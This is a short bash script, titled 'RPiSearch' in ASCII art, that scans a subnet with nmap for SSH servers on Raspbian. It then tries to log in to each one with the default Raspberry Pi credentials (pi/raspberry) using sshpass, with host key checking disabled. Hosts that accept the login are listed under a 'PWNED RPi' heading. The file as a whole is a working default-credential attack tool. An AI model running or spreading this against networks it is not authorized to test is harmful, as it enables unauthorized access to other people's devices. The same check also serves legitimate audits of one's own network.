#!/bin/bash
echo "

██████╗ ██████╗ ██╗███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
██████╔╝██████╔╝██║███████╗█████╗  ███████║██████╔╝██║     ███████║
██╔══██╗██╔═══╝ ██║╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║
██║  ██║██║     ██║███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

"
range="192.168.1.0/24"
echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m SCANNING FOR RPi on $range  \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
nmap --script=banner -p 22 $range >> liste_rpi.txt
grep -B 5 Raspbian liste_rpi.txt  >> liste_open.txt
#grep -B 4 open liste_rpi.txt >> liste_open.txt
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" liste_open.txt >> ip_ssh_open.txt
echo " List of exposed ssh server : "
echo ""
cat ip_ssh_open.txt
echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m TRYING DEFAUT LOGIN FOR RPi  \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
cat ip_ssh_open.txt |  while read output
do
    echo "check for $output"
    out=$(sshpass -p 'raspberry' ssh -T -o StrictHostKeyChecking=no  pi@$output echo ok 2>&1)
    echo $out > tmp.txt
    string1="ok"
    if grep -qF "$string1" tmp.txt;then
        echo "$output is vulnerable !!!"
        echo $output >> vulerables_rpi.txt
    else
        echo "$output is not vulnerable"
    fi
done
rm tmp.txt > /dev/null 2>&1
rm liste_rpi.txt > /dev/null 2>&1
rm liste_open.txt > /dev/null 2>&1
rm ip_ssh_open.txt > /dev/null 2>&1
echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m PWNED RPi : \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
cat vulerables_rpi.txt
